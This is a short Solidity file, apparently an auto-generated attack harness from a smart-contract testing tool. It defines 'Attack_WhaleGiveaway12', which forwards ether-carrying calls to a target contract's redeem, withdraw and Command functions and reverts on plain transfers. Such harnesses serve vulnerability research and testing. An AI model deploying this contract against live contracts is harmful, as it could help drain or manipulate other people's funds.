pragma solidity ^0.4.19;

import "./WhaleGiveaway1.sol";

contract Attack_WhaleGiveaway12 {

  WhaleGiveaway1 public target_contract;

  function Attack_WhaleGiveaway12(address _targetContract) public payable {
      target_contract = WhaleGiveaway1(_targetContract);
  } 

  function vultron_redeem(uint256 vultron_amount) public payable{
    target_contract.redeem.value(vultron_amount)();
  } 

  function vultron_withdraw(uint256 vultron_amount) public payable{
    target_contract.withdraw.value(vultron_amount)();
  } 

  function vultron_Command(uint256 vultron_amount, address adr, bytes data) public payable{
    target_contract.Command.value(vultron_amount)(adr, data);
  } 

  function() public payable {
    revert();
  }
} 
